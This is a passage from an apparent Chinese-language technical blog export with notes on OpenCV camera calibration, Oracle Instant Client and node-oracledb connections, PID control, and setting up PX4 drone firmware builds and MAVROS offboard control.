<h1 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h1><p>您也可以在OpenCV源库的samples / cpp / tutorial_code / calib3d / camera_calibration /文件夹中找到源代码，或从此处下载。要使用该程序，请使用-h参数运行它。该程序有一个重要的参数：配置文件的名称。如果没有给出，那么它将尝试打开名为“default.xml”的那个。这是XML格式的示例配置文件。在配置文件中，您可以选择将相机用作输入，视频文件或图像列表。如果选择最后一个，则需要创建一个配置文件，用于枚举要使用的图像。这是一个例子。要记住的重要部分是需要使用绝对路径或应用程序工作目录中的相对路径来指定图像。您可以在上面提到的samples目录中找到所有这些。</p>
<p>应用程序启动时从配置文件中读取设置。虽然这是它的一个重要部分，但它与本教程的主题无关：摄像机校准。因此，我选择不在此处发布该部分的代码。有关如何执行此操作的技术背景，您可以在使用XML和YAML文件的文件输入和输出教程中找到。</p>
<h1 id="构建相机标定程序"><a href="#构建相机标定程序" class="headerlink" title="构建相机标定程序"></a>构建相机标定程序</h1><p>切换到camera_calibration示例教程源代码所在目录，创建build临时目录并创建CMakeLists.txt文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~&#x2F;opencv&#x2F;samples&#x2F;cpp&#x2F;tutorial_code&#x2F;calib3d&#x2F;camera_calibration&#x2F;</span><br><span class="line">mkdir build</span><br><span class="line">touch CMakeLists.txt</span><br></pre></td></tr></table></figure>

<p>CMakeLists.txt文件内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmake_minimum_required(VERSION 2.8)</span><br><span class="line">set (CMAKE_CXX_STANDARD 11)</span><br><span class="line">project( camera_calibration )</span><br><span class="line">find_package( OpenCV REQUIRED )</span><br><span class="line">include_directories( $&#123;OpenCV_INCLUDE_DIRS&#125; )</span><br><span class="line">add_executable( camera_calibration camera_calibration.cpp )</span><br><span class="line">target_link_libraries( camera_calibration $&#123;OpenCV_LIBS&#125; )</span><br></pre></td></tr></table></figure>

<p>构建相机标定程序：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd build</span><br><span class="line">cmake ..</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<h1 id="运行相机标定程序"><a href="#运行相机标定程序" class="headerlink" title="运行相机标定程序"></a>运行相机标定程序</h1><p>运行相机标定程序的目的在于获得相机的失真参数和内外参，其中相机的失真参数和内参只需标定一次便不再变化。下面以标定笔记本自带摄像头说明运行相机标定程序的步骤。</p>
<h2 id="修改标定配置参数"><a href="#修改标定配置参数" class="headerlink" title="修改标定配置参数"></a>修改标定配置参数</h2><p>找到camera_calibration/in_VID5.xml文件，这是标定程序使用的配置文件，需要设置里面的几个参数。</p>
<ul>
<li>修改棋盘格交叉点参数</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- Number of inner corners per a item row and column. (square, circle) --&gt;</span><br><span class="line">&lt;BoardSize_Width&gt;9&lt;&#x2F;BoardSize_Width&gt;</span><br><span class="line">&lt;BoardSize_Height&gt;6&lt;&#x2F;BoardSize_Height&gt;</span><br></pre></td></tr></table></figure>

<p>需要特别注意的是，这里的宽度和高度是指内部交叉点的个数，而不是方形格的个数。如图1所示的棋盘格，内部交叉点的宽度是9，高度是6。请务必填写正确，否则无法标定。</p>
<p align="center">
    <img src="images/chess.png" width="90%" alt="用于相机标定的棋盘格"/>
</p>
<center>图1  用于相机标定的棋盘格</center>

<ul>
<li>修改每格的宽度</li>
</ul>
<p>每格的宽度应设置为实际的毫米数，该参数的实际用途尚待考证。目前看来，即使设置的不准确也无大碍。根据我使用的棋盘格，设置棋盘格参数42。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- The size of a square in some user defined metric system (pixel, millimeter)--&gt;</span><br><span class="line">&lt;Square_Size&gt;42&lt;&#x2F;Square_Size&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>设置图像输入方式</li>
</ul>
<p>例程提供了三种输入方式。不过，如果待标定的摄像头已经接入电脑，建议使用input camera方式。该方式只需要设置视频输入设备号，对于笔记本电脑来说，通常0表示笔记本自带摄像头，1表示外接摄像头。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  &lt;!-- The input to use for calibration. </span><br><span class="line">        To use an input camera -&gt; give the ID of the camera, like &quot;1&quot;</span><br><span class="line">        To use an input video  -&gt; give the path of the input video, like &quot;&#x2F;tmp&#x2F;x.avi&quot;</span><br><span class="line">        To use an image list   -&gt; give the path to the XML or YAML file containing the list of the images, like &quot;&#x2F;tmp&#x2F;circles_list.xml&quot;</span><br><span class="line">        --&gt;</span><br><span class="line">&lt;Input&gt;&quot;0&quot;&lt;&#x2F;Input&gt;</span><br></pre></td></tr></table></figure>


<h2 id="执行相机标定程序"><a href="#执行相机标定程序" class="headerlink" title="执行相机标定程序"></a>执行相机标定程序</h2><p>运行如下命令开始标定笔记本自带摄像头，标定完成后将得到保存相关参数的文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;camera_calibration ..&#x2F;in_VID5.xml</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://docs.opencv.org/4.1.0/db/df5/tutorial_linux_gcc_cmake.html" target="_blank" rel="noopener">Using OpenCV with gcc and CMake</a>,by opencv.</li>
<li><a href="https://docs.opencv.org/4.1.0/d4/d94/tutorial_camera_calibration.html" target="_blank" rel="noopener">Camera calibration With OpenCV</a>,by opencv.</li>
<li><a href="https://stackoverflow.com/questions/49012222/c11-activation-with-target-compile-feature-or-set-cmake-cxx-standard" target="_blank" rel="noopener">C++11 activation with <target_compile_feature> or &lt;set (CMAKE_CXX_STANDARD)&gt;</a>,by stackoverflow.</li>
<li><a href="https://huangwang.github.io/2018/11/19/计算机视觉之相机成像原理与坐标系转换/">计算机视觉之相机成像原理与坐标系转换</a>,by jack huang.</li>
<li><a href="https://www.jianshu.com/p/967a35dbb56a" target="_blank" rel="noopener">OpenCV 相机参数标定（Camera Calibration）</a>,by Wafei.</li>
<li><a href="https://zhuanlan.zhihu.com/p/32030223" target="_blank" rel="noopener">图像二维坐标转世界三维坐标</a>, by 橙子.</li>
<li><a href="https://blog.csdn.net/cocoaqin/article/details/77485436" target="_blank" rel="noopener">solvepnp三维位姿估算</a>,by cocoaqin.</li>
<li><a href="http://zhaoxuhui.top/blog/2018/03/08/%E5%8D%95%E7%9B%AESLAM%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80.html" target="_blank" rel="noopener">单目SLAM理论基础</a>,by zhaoxuhui.</li>
<li><a href="http://zhaoxuhui.top/blog/2018/03/18/Location&PoseEstimationInSLAM.html" target="_blank" rel="noopener">SLAM相机位姿估计(1)</a>,by zhaoxuhui.</li>
<li><a href="https://zhuanlan.zhihu.com/p/24651968" target="_blank" rel="noopener">张氏法相机标定</a>,by Lstyle.</li>
<li><a href="https://www.zhihu.com/question/29448299" target="_blank" rel="noopener">机器视觉的相机标定到底是什么？</a>, by zhihu.</li>
<li><a href="https://zhuanlan.zhihu.com/p/30813733" target="_blank" rel="noopener">相机标定究竟在标定什么？</a>,by 许翔翔.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机视觉</tag>
        <tag>opencv</tag>
      </tags>
  </entry>
  <entry>
    <title>Oracle即时客户端连接方法</title>
    <url>/2023/01/10/Oracle%E5%8D%B3%E6%97%B6%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9E%E6%8E%A5%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>记录Oracle即时客户端连接Oracle服务器端的方法。</p>
<h1 id="下载Oracle即时客户端"><a href="#下载Oracle即时客户端" class="headerlink" title="下载Oracle即时客户端"></a>下载Oracle即时客户端</h1><p>对应Oracle11数据库，下载如下Oracle即时客户端：</p>
<ul>
<li>instantclient-basic-windows.x64-12.1.0.2.0.zip</li>
<li>instantclient-sqlplus-windows.x64-12.1.0.2.0.zip</li>
</ul>
<p>将instantclient-basic和instantclient-sqlplus两个安装包放在同一个目录下，解压到同一个文件夹内。</p>
<h1 id="修改系统变量"><a href="#修改系统变量" class="headerlink" title="修改系统变量"></a>修改系统变量</h1><ul>
<li>将Oracle即时客户端的路径E:\Oracle\instantclient_12_1添加到系统环境变量PATH中。</li>
<li>新增系统变量NLS_LANG=AMERICAN_AMERICA.WE8MSWIN1252   –&gt;&gt; 服务器端字符集</li>
<li>TNS_ADMIN=E:\Oracle\instantclient_12_1       –&gt;&gt; 指定tnsnames.ora所在位置</li>
</ul>
<h1 id="新建tnsnames-ora"><a href="#新建tnsnames-ora" class="headerlink" title="新建tnsnames.ora"></a>新建tnsnames.ora</h1><p>在E:\Oracle\instantclient_12_1 下新建tnsnames.ora配置文件，内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">orcl_service_name &#x3D;</span><br><span class="line">  (DESCRIPTION &#x3D;</span><br><span class="line">    (ADDRESS &#x3D; (PROTOCOL &#x3D; tcp)(HOST &#x3D; localhost)(PORT &#x3D; 1521)(QUEUESIZE &#x3D; 100))</span><br><span class="line">    (CONNECT_DATA &#x3D;</span><br><span class="line">      (SERVICE_NAME &#x3D; bookstore.company.com)</span><br><span class="line">    )</span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">orcl_sid &#x3D;</span><br><span class="line">  (DESCRIPTION &#x3D;</span><br><span class="line">    (ADDRESS_LIST &#x3D;</span><br><span class="line">      (ADDRESS &#x3D; (PROTOCOL &#x3D; TCP)(HOST &#x3D; 192.168.1.11)(PORT &#x3D; 1521))</span><br><span class="line">    )</span><br><span class="line">    (CONNECT_DATA &#x3D;</span><br><span class="line">      (SERVER &#x3D; DEDICATED)</span><br><span class="line">      (SID &#x3D; orcl)</span><br><span class="line">    )</span><br><span class="line">  )</span><br></pre></td></tr></table></figure>
<h1 id="用SQL-Plus登陆测试"><a href="#用SQL-Plus登陆测试" class="headerlink" title="用SQL*Plus登陆测试"></a>用SQL*Plus登陆测试</h1><h2 id="Connect-via-SERVICE-NAME"><a href="#Connect-via-SERVICE-NAME" class="headerlink" title="Connect via SERVICE_NAME"></a>Connect via SERVICE_NAME</h2><p>sqlplus username/password@host:port/SERVICE_NAME</p>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlplus admin&#x2F;123456@192.168.1.11:1521&#x2F;ORCL</span><br></pre></td></tr></table></figure>

<h2 id="Connect-via-SID"><a href="#Connect-via-SID" class="headerlink" title="Connect via SID"></a>Connect via SID</h2><p>sqlplus username/password@host:port:SID，注意该方式在oracle instant client 12.1版本中没有验证通过，具体原因未知。</p>
<p>sqlplus system/password@(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(Host=192.168.0.49)(Port=1521))(CONNECT_DATA=(SID=ORCL)))</p>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlplus admin&#x2F;123456@(DESCRIPTION&#x3D;(ADDRESS&#x3D;(PROTOCOL&#x3D;TCP)(Host&#x3D;192.168.0.49)(Port&#x3D;1521))(CONNECT_DATA&#x3D;(SID&#x3D;ORCL)))</span><br></pre></td></tr></table></figure>

<h2 id="sqlplus命令"><a href="#sqlplus命令" class="headerlink" title="sqlplus命令"></a>sqlplus命令</h2><p>sqlplus登录后，使用如下sql命令查询相关信息：</p>
<ul>
<li>查看数据库名</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SQL&gt; select name from v$database;</span><br></pre></td></tr></table></figure>

<ul>
<li>查询当前数据库实例名</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SQL&gt; select instance_name from v$instance;</span><br></pre></td></tr></table></figure>

<ul>
<li>数据库中所有表</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SQL&gt; SELECT TABLE_NAME FROM DBA_TABLES;</span><br></pre></td></tr></table></figure>

<ul>
<li>显示数据库对象结构</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SQL&gt; desc emp</span><br></pre></td></tr></table></figure>

<h1 id="使用node-oracledb连接数据库"><a href="#使用node-oracledb连接数据库" class="headerlink" title="使用node-oracledb连接数据库"></a>使用node-oracledb连接数据库</h1><h2 id="连接字符串的网络服务名方法"><a href="#连接字符串的网络服务名方法" class="headerlink" title="连接字符串的网络服务名方法"></a>连接字符串的网络服务名方法</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const oracledb &#x3D; require(&#39;oracledb&#39;);</span><br><span class="line"></span><br><span class="line">const connection &#x3D; await oracledb.getConnection(</span><br><span class="line">  &#123;</span><br><span class="line">    user          : &quot;admin&quot;,</span><br><span class="line">    password      : &quot;123456&quot;,  </span><br><span class="line">    connectStringForServiceName1 : &quot;Ora11&quot;</span><br><span class="line">    connectStringForServiceName2 : &quot;192.168.0.49&#x2F;ORCL&quot;,</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>对应的tnsnames.ora内容为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ora11 &#x3D;</span><br><span class="line">  (DESCRIPTION &#x3D;</span><br><span class="line">    (ADDRESS &#x3D; (PROTOCOL &#x3D; TCP)(HOST &#x3D; 192.168.0.49)(PORT &#x3D; 1521))</span><br><span class="line">    (CONNECT_DATA &#x3D;</span><br><span class="line">      (SERVER &#x3D; DEDICATED)</span><br><span class="line">      (SERVICE_NAME &#x3D; ORCL)</span><br><span class="line">    )</span><br><span class="line">  )</span><br></pre></td></tr></table></figure>

<h2 id="连接字符串的网络服务标识方法"><a href="#连接字符串的网络服务标识方法" class="headerlink" title="连接字符串的网络服务标识方法"></a>连接字符串的网络服务标识方法</h2><p><strong>该方式可连接使用sid的oracle实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const connection &#x3D; await oracledb.getConnection(</span><br><span class="line">  &#123;</span><br><span class="line">    user          : &quot;admin&quot;,</span><br><span class="line">    password      : &quot;123456&quot;,  </span><br><span class="line">    connectStringForSid1 : &quot;Ora11&quot;,</span><br><span class="line">    connectStringForSid2 : &quot;(DESCRIPTION&#x3D;(ADDRESS&#x3D;(PROTOCOL&#x3D;TCP)(Host&#x3D;192.168.0.49)(Port&#x3D;1521))(CONNECT_DATA&#x3D;(SID&#x3D;ORCL)))&quot;</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>对应的tnsnames.ora内容为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ora11 &#x3D;</span><br><span class="line">  (DESCRIPTION &#x3D;</span><br><span class="line">    (ADDRESS &#x3D; (PROTOCOL &#x3D; TCP)(HOST &#x3D; 192.168.0.49)(PORT &#x3D; 1521))</span><br><span class="line">    (CONNECT_DATA &#x3D;</span><br><span class="line">      (SERVER &#x3D; DEDICATED)</span><br><span class="line">      (SID &#x3D; ORCL)</span><br><span class="line">    )</span><br><span class="line">  )</span><br></pre></td></tr></table></figure>

<h1 id="oracledb读取Blob和Clob字段"><a href="#oracledb读取Blob和Clob字段" class="headerlink" title="oracledb读取Blob和Clob字段"></a>oracledb读取Blob和Clob字段</h1><p>请参考<a href="https://blog.csdn.net/qq_30682027/article/details/82773853" target="_blank" rel="noopener">nodejs使用oracledb时，读取Blob和Clob字段遇到的问题</a>。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/whatday/article/details/84950360" target="_blank" rel="noopener">如何安装Oracle客户端（Oracle Instant Client）</a>,by whatday.</li>
<li><a href="https://developer.aliyun.com/article/248417" target="_blank" rel="noopener">Oracle Instant Client（即时客户端） 安装与配置</a>,by 长烟慢慢.</li>
<li><a href="https://zhuanlan.zhihu.com/p/25295860" target="_blank" rel="noopener">使用 SQL *Plus 管理 Oracle 数据库</a>,by Node.</li>
<li><a href="https://blog.csdn.net/qq_30682027/article/details/82773853" target="_blank" rel="noopener">nodejs使用oracledb时，读取Blob和Clob字段遇到的问题</a>,by 欢欢2776479680.</li>
<li><a href="https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html" target="_blank" rel="noopener">CLOB data type</a>,by oracle.</li>
<li><a href="https://www.51cto.com/article/550506.html" target="_blank" rel="noopener">Oracle的CLOB大数据字段类型</a>,by Grand-Jon.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>PID控制算法原理分析</title>
    <url>/2019/02/09/PID%E6%8E%A7%E5%88%B6%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>最近研究深度强化学习算法，进而对控制理论感兴趣，发现了PID这个广泛使用的控制算法。大概了解记录一下。<strong>PID控制器（比例-积分-微分控制器），由比例单元(P)、积分单元(I)和微分单元(D)组成。透过Kp，Ki和Kd三个参数的设定。PID控制器主要适用于基本上线性，且动态特性不随时间变化的系统</strong>。</p>
<p align="center">
    <img src="images/Pid-feedback-nct-int-correct.png" width="90%" alt="PID控制器的方块图"/>
</p>
<center>图1  PID控制器的方块图</center>

<p>PID是以它的三种纠正算法而命名。受控变数是三种算法（比例、积分、微分）相加后的结果，即为其输出，其输入为误差值（设定值减去测量值后的结果）或是由误差值衍生的信号。若定义 $u(t)$为控制输出，PID算法可以用下式表示：</p>
<p>$$ {u}(t)= {MV}(t)=K_{p}e(t)+K_i\int _{0}^{t}{e(\tau )}{d\tau }+K_d{\frac{d}{dt}}e(t)$$</p>
<p>其中:</p>
<p>$K_{p}$：比例增益，是调适参数</p>
<p>$K_{i}$：积分增益，也是调适参数</p>
<p>$K_{d}$：微分增益，也是调适参数</p>
<p>$e$：误差=设定值（SP）- 回授值（PV）</p>
<p>$t$：目前时间</p>
<p>$\tau$ ：积分变数，数值从0到目前时间 $t$</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/PID控制器" target="_blank" rel="noopener">PID控制器</a>,by wikipedia.</li>
<li><a href="https://zhuanlan.zhihu.com/p/39573490" target="_blank" rel="noopener">PID控制算法原理（抛弃公式，从本质上真正理解PID控制）</a>,by 确定有穷自动机.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>控制理论</tag>
      </tags>
  </entry>
  <entry>
    <title>PX4编译开发环境配置</title>
    <url>/2019/04/26/PX4%E7%BC%96%E8%AF%91%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>拟在基于NuttX的硬件平台如Pixhawk系列开源硬件平台上运行自定义的Px4自驾仪软件，因此需要建立Px4的编译开发环境。以官方文档推荐，在Ubuntu 16.04 LTS操作系统上建立Px4编译开发环境为例，记录整个配置过程。</p>
<h1 id="安装Ubuntu-16-04-LTS"><a href="#安装Ubuntu-16-04-LTS" class="headerlink" title="安装Ubuntu 16.04 LTS"></a>安装Ubuntu 16.04 LTS</h1><p>官方推荐在Mac OS和Linux上进行开发，因此选择安装Ubuntu 16.04 LTS作为Px4开发的操作系统。主要步骤如下：</p>
<ol>
<li>安装VirtualBox系统虚拟机</li>
<li>在VirtualBox创建虚拟机</li>
<li>在虚拟机中安装Ubuntu 16.04 LTS操作系统</li>
</ol>
<h1 id="Ubuntu中安装工具链"><a href="#Ubuntu中安装工具链" class="headerlink" title="Ubuntu中安装工具链"></a>Ubuntu中安装工具链</h1><h2 id="权限设置"><a href="#权限设置" class="headerlink" title="权限设置"></a>权限设置</h2><p>为了使当前用户能够访问串口，将当前用户添加到dialout组。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo usermod -a -G dialout $USER</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>

<h2 id="安装工具链"><a href="#安装工具链" class="headerlink" title="安装工具链"></a>安装工具链</h2><h3 id="Pixhawk-NuttX-and-jMAVSim"><a href="#Pixhawk-NuttX-and-jMAVSim" class="headerlink" title="Pixhawk/NuttX (and jMAVSim)"></a>Pixhawk/NuttX (and jMAVSim)</h3><p>针对基于NuttX的硬件平台如Pixhawk构建开发工具链，步骤如下：</p>
<ol>
<li>下载ubuntu_sim_nuttx.sh</li>
<li>运行脚本ubuntu_sim_nuttx.sh</li>
<li>完成后重启</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PX4&#x2F;Devguide&#x2F;master&#x2F;build_scripts&#x2F;ubuntu_sim_nuttx.sh</span><br><span class="line">source ubuntu_sim_nuttx.sh</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>

<h1 id="编译Px4软件"><a href="#编译Px4软件" class="headerlink" title="编译Px4软件"></a>编译Px4软件</h1><h2 id="下载Px4源代码"><a href="#下载Px4源代码" class="headerlink" title="下载Px4源代码"></a>下载Px4源代码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir -p ~&#x2F;src</span><br><span class="line">cd ~&#x2F;src</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;PX4&#x2F;Firmware.git</span><br><span class="line"></span><br><span class="line">cd Firmware</span><br><span class="line"></span><br><span class="line"># list the releases (tags)</span><br><span class="line">git tag -l</span><br><span class="line"></span><br><span class="line"># Checkout code for particular tag (e.g. for tag v1.8.2 stable version)</span><br><span class="line">git checkout v1.8.2</span><br><span class="line"></span><br><span class="line">git submodule update --init --recursive</span><br></pre></td></tr></table></figure>

<p>现在可以通过编译源代码来构建二进制文件。在直接使用硬件前，推荐先<strong>进行仿真</strong>。</p>
<h2 id="jMAVSim仿真器"><a href="#jMAVSim仿真器" class="headerlink" title="jMAVSim仿真器"></a>jMAVSim仿真器</h2><p>在直接使用硬件之前，以jMAVSim仿真器为目标平台构建PX4，验证PX4的正确性。<strong>注意在virtualbox中启动3D图形加速，防止jMAVSim运行出错！</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">make posix jmavsim</span><br><span class="line"></span><br><span class="line"># 起飞四旋翼无人机</span><br><span class="line">pxh&gt; commander takeoff</span><br></pre></td></tr></table></figure>

<h2 id="基于NuttX-Pixhawk的硬件板"><a href="#基于NuttX-Pixhawk的硬件板" class="headerlink" title="基于NuttX / Pixhawk的硬件板"></a>基于NuttX / Pixhawk的硬件板</h2><p>以Pixhawk为目标平台，构建PX4。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd Firmware</span><br><span class="line">make px4fmu-v2_default</span><br></pre></td></tr></table></figure>

<p>注意到“make”是一个字符命令编译工具，“px4fmu-v2”是硬件/ardupilot版本，“default”是默认配置，所有的PX4编译目标遵循这个规则。</p>
<p>成功编译的最后输出是这样的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[100%] Linking CXX executable firmware_nuttx</span><br><span class="line">[100%] Built target firmware_nuttx</span><br><span class="line">Scanning dependencies of target build&#x2F;firmware_px4fmu-v2</span><br><span class="line">[100%] Generating nuttx-px4fmu-v2-default.px4</span><br><span class="line">[100%] Built target build&#x2F;firmware_px4fmu-v2</span><br></pre></td></tr></table></figure>

<p>通过在命令后面添加‘upload’，编译的二进制程序就会通过USB上传到飞控硬件:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">make px4fmu-v2_default upload</span><br></pre></td></tr></table></figure>

<p>上传成功时输出情况如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Erase  : [&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;] 100.0%</span><br><span class="line">Program: [&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;] 100.0%</span><br><span class="line">Verify : [&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;] 100.0%</span><br><span class="line">Rebooting.</span><br><span class="line"></span><br><span class="line">[100%] Built target upload</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://dev.px4.io/en/" target="_blank" rel="noopener">PX4 Development Guide (STABLE - v1.8.2)</a>,by Dronecode.</li>
<li><a href="https://dev.px4.io/zh/" target="_blank" rel="noopener">PX4开发指南</a>, by Dronecode.</li>
<li><a href="https://github.com/DrTon/jMAVSim/issues/42" target="_blank" rel="noopener">running JMAVSim in vmware fails</a>, by jMAVSim issues.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>无人机</tag>
        <tag>飞行仿真</tag>
        <tag>PX4</tag>
      </tags>
  </entry>
  <entry>
    <title>PX4无人机MAVROS外部控制教程</title>
    <url>/2019/05/15/PX4%E6%97%A0%E4%BA%BA%E6%9C%BAMAVROS%E5%A4%96%E9%83%A8%E6%8E%A7%E5%88%B6%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>PX4中的offboard模式能够接受来自外部的控制指令，搭配机载或支持MAVROS的协同计算机，可在PX4飞控平台上加入视觉处理或人工智能，以实现无人机自动控制功能。下面即介绍如何在基于MAVROS的协同计算机上运行程序控制PX4无人机。具体过程如下：</p>
<h1 id="PX4固件参数设置"><a href="#PX4固件参数设置" class="headerlink" title="PX4固件参数设置"></a>PX4固件参数设置</h1><p>在开始无人机外部控制开发之前，您需要在PX4固件中设置两件事:</p>
<ul>
<li>将RC开关映射到场外模式激活</li>
</ul>
<p>要执行此操作，请在QGroundControl中加载参数并查找RC_MAP_OFFB_SW参数，您可以为其分配要用于激活offboard模式的RC通道。 以这样一种方式映射事物是非常有用的。当你脱离offboard模式时，你会进入位置控制。</p>
<p>虽然此步骤不是强制性的，因为您可以使用MAVLink消息激活offboard模式。 我们认为这种方法更安全。</p>
<ul>
<li>启用配套计算机接口</li>
</ul>
<p>查找SYS_COMPANION参数并将其设置为921600（推荐）或57600. 此参数将激活<strong>Telem2</strong>端口上的MAVLink流，其中包含特定于板载模式的数据流以及相应的波特率（921600 8N1或57600 8N1）。 </p>
<p><strong>本人实验测试时SYS_COMPANION参数设置成Companion Link(57600) 。此外要注意通过Telem2端口的无线收发装置与地面支持MAVROS的具有无线收发装置的协同计算机连接。并长按安全锁手动解锁无人机。</strong></p>
<h1 id="安装MAVROS"><a href="#安装MAVROS" class="headerlink" title="安装MAVROS"></a>安装MAVROS</h1><p>在地面协同计算机上安装MAVROS请参考<a href="https://huangwang.github.io/2019/05/10/Ubuntu16-04%E5%AE%89%E8%A3%85MAVROS/">Ubuntu16.04安装MAVROS</a>，完成后使用如下命令启动MAVROS:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ roscore</span><br><span class="line"># 启动MAVROS,链接到本地ROS</span><br><span class="line">$ roslaunch mavros px4.launch fcu_url:&#x3D;serial:&#x2F;&#x2F;&#x2F;dev&#x2F;ttyUSB0:57600</span><br></pre></td></tr></table></figure>

<h1 id="构建Offboard示例程序"><a href="#构建Offboard示例程序" class="headerlink" title="构建Offboard示例程序"></a>构建Offboard示例程序</h1><p>ROS节点Offboard示例程序的构建请参考<a href="https://huangwang.github.io/2019/05/15/ROS构建Package和Node的教程/">ROS构建Package和Node的教程</a>，完成后使用如下命令启动Offboard示例程序：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd catkin_ws&#x2F;</span><br><span class="line">$ source devel&#x2F;setup.bash</span><br><span class="line">$ rosrun offboard offboard_node</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://huangwang.github.io/2019/05/15/PX4软件在环仿真之MAVROS外部控制/">PX4软件在环仿真之MAVROS外部控制</a>,by jackhuang. </li>
<li><a href="https://dev.px4.io/en/ros/offboard_control.html" target="_blank" rel="noopener">Offboard Control</a>, by dronecode.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>PX4</tag>
        <tag>Gazebo</tag>
      </tags>
  </entry>
  <entry>
    <title>PX4开发基本概念解读</title>
    <url>/2019/04/27/PX4%E5%BC%80%E5%8F%91%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E8%A7%A3%E8%AF%BB/</url>
    <content><![CDATA[<p>进行PX4开发，必先了解PX4体系结构及相关概念。下面及简要介绍PX4开发的相关知识。</p>
<h1 id="PX4体系结构"><a href="#PX4体系结构" class="headerlink" title="PX4体系结构"></a>PX4体系结构</h1><p>PX4由两个层次组成：一是飞行控制栈(flight stack)，即自驾仪的软件解决方案，二是中间件，一种可以支持任意类型自主机器人的通用机器人中间件。</p>
<p>所有的无人机机型，事实上所有的包括船舶在内的机器人系统，都具有同一代码库。整个系统设计是反应式(reactive)的，这意味着：</p>
<ul>
<li>所有的功能被划分为可替换部件</li>
<li>通过异步消息传递进行通信</li>
<li>该系统可以应对不同的工作负载</li>
</ul>
<p>除了这些运行时考虑之外，其模块化最大限度地提高了系统的可重用性。</p>
<p align="center">
    <img src="images/PX4_Architecture.svg" width="90%" alt="PX4体系结构"/>
</p>
<center>图1  PX4体系结构</center>

